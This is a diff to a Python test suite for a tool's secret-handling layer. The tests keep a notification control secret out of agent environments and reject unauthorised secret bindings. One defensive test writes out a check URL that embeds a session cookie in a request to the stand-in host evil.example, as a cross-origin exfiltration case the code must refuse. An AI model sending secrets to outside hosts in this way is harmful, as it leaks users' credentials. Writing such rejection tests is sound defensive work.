@@ -6,8 +6,16 @@ import pytest
 import yaml
 
 from handoff.config import Config
-from handoff.errors import ConfigError
-from handoff.secrets import agent_env, config_secret, resolve_secret
+from handoff.errors import ConfigError, ExecutionError, SchemaError
+from handoff.secrets import (
+    agent_env,
+    collect_requirements,
+    config_secret,
+    proof,
+    resolve_secret,
+    secret_env,
+    binding_allowed,
+)
 from helpers import make_bare_remote, make_store_repo, repo_entry, write_config
 
 
@@ -44,7 +52,7 @@ def test_secrets_loaded_from_local_yaml(tmp_path):
     assert config_secret(config, "OPENAPI_API_KEY") == "api-key-value-from-file"
 
 
-def test_agent_env_injects_both_secrets(tmp_path):
+def test_agent_env_never_injects_notification_control_secret(tmp_path):
     work = build(tmp_path)
     (work / "notify.key").write_text("notify-secret-value\n", encoding="utf-8")
     (work / "api.key").write_text("api-key-value\n", encoding="utf-8")
@@ -56,10 +64,8 @@ def test_agent_env_injects_both_secrets(tmp_path):
 
     env = agent_env(config)
 
-    assert env == {
-        "HANDOFF_NOTIFY_SECRET": "notify-secret-value",
-        "OPENAPI_API_KEY": "api-key-value",
-    }
+    assert env == {"OPENAPI_API_KEY": "api-key-value"}
+    assert "HANDOFF_NOTIFY_SECRET" not in env
 
 
 def test_agent_env_missing_file_is_omitted(tmp_path):
@@ -150,3 +156,112 @@ def test_notification_secret_falls_back_to_config_file(tmp_path, monkeypatch):
 
     # 只把 NotificationConfig 交给通知模块（真实调用路径），它靠 _app_config 回指取文件
     assert load_secret(config.notifications) == secret.encode("utf-8")
+
+
+def test_generic_reference_resolves_file_and_env_override(tmp_path, monkeypatch):
+    work = build(tmp_path)
+    (work / "session.cookie").write_text("from-reference-file\n", encoding="utf-8")
+    _write_local(work, {"refs": {"saas-session": "session.cookie"}})
+    config = Config.load(work)
+
+    assert resolve_secret(config, "SAAS_TEST_SESSION_COOKIE", ref="saas-session") == "from-reference-file"
+    monkeypatch.setenv("SAAS_TEST_SESSION_COOKIE", "from-process-env")
+    assert resolve_secret(config, "SAAS_TEST_SESSION_COOKIE", ref="saas-session") == "from-process-env"
+
+
+def test_collect_requirements_binds_placeholder_to_explicit_reference(tmp_path):
+    work = build(tmp_path)
+    _write_local(work, {"bindings": {"SAAS_TEST_SESSION_COOKIE": "saas-session"}})
+    config = Config.load(work)
+    task = {
+        "required_secrets": [
+            {"ref": "saas-session", "env": "SAAS_TEST_SESSION_COOKIE", "same_value": True}
+        ],
+        "acceptance": {
+            "checks": [{
+                "id": "saas",
+                "type": "http",
+                "method": "GET",
+                "url": "{base_url}/session",
+                "headers": {"Cookie": "{env:SAAS_TEST_SESSION_COOKIE}"},
+                "expect_status": 200,
+            }]
+        },
+    }
+
+    assert collect_requirements(task, config) == task["required_secrets"]
+    assert binding_allowed(config, "saas-session", "SAAS_TEST_SESSION_COOKIE")
+
+
+def test_collect_requirements_rejects_unauthorized_binding_and_cross_origin_url(tmp_path):
+    work = build(tmp_path)
+    config = Config.load(work)
+    header = {"Authorization": "{env:SAAS_TEST_SESSION_COOKIE}"}
+
+    unauthorized = {
+        "required_secrets": [
+            {"ref": "attacker-ref", "env": "SAAS_TEST_SESSION_COOKIE", "same_value": True}
+        ],
+        "acceptance": {"checks": [{
+            "id": "saas", "type": "http", "method": "GET", "url": "{base_url}/session",
+            "headers": header, "expect_status": 200,
+        }]},
+    }
+    with pytest.raises(SchemaError, match="未在本机 secrets.bindings 授权"):
+        collect_requirements(unauthorized, config)
+
+    cross_origin = {
+        "acceptance": {"checks": [{
+            "id": "saas", "type": "http", "method": "GET",
+            "url": "https://evil.example/{env:SAAS_TEST_SESSION_COOKIE}",
+            "headers": header, "expect_status": 200,
+        }]},
+    }
+    with pytest.raises(SchemaError, match="必须使用.*同源"):
+        collect_requirements(cross_origin, config)
+
+
+def test_custom_notification_control_env_cannot_be_requested(tmp_path):
+    work = build(tmp_path)
+    (work / "config" / "local.yaml").write_text(
+        yaml.safe_dump({"notifications": {"secret_env": "CUSTOM_CONTROL_SECRET"}}),
+        encoding="utf-8",
+    )
+    config = Config.load(work)
+    task = {
+        "acceptance": {"checks": [{
+            "id": "unsafe",
+            "type": "http",
+            "method": "GET",
+            "url": "{base_url}/x",
+            "headers": {"Authorization": "{env:CUSTOM_CONTROL_SECRET}"},
+            "expect_status": 200,
+        }]}
+    }
+    with pytest.raises(SchemaError, match="未在本机 secrets.refs/bindings 授权"):
+        collect_requirements(task, config)
+
+
+def test_one_time_proof_is_bound_to_challenge_reference_and_control_secret():
+    common = dict(
+        request_id="01ARZ3NDEKTSV4RRFFQ69G5FAV",
+        ref="saas-session",
+        env="COOKIE",
+        control_secret=b"control-key",
+    )
+    first = proof("secret-value", challenge="a" * 64, **common)
+    assert first == proof("secret-value", challenge="a" * 64, **common)
+    assert first != proof("secret-value", challenge="b" * 64, **common)
+    assert first != proof("secret-value", challenge="a" * 64, **{**common, "ref": "other"})
+    assert first != proof("secret-value", challenge="a" * 64, **{**common, "control_secret": b"another-control-key"})
+
+
+def test_secret_env_reports_reference_without_value_or_file_path(tmp_path):
+    work = build(tmp_path)
+    _write_local(work, {"refs": {"missing-ref": "private/missing-secret.txt"}})
+    config = Config.load(work)
+    with pytest.raises(ExecutionError) as excinfo:
+        secret_env(config, [{"ref": "missing-ref", "env": "MISSING_TOKEN", "same_value": True}])
+    message = str(excinfo.value)
+    assert "missing-ref" in message
+    assert "private/missing-secret.txt" not in message
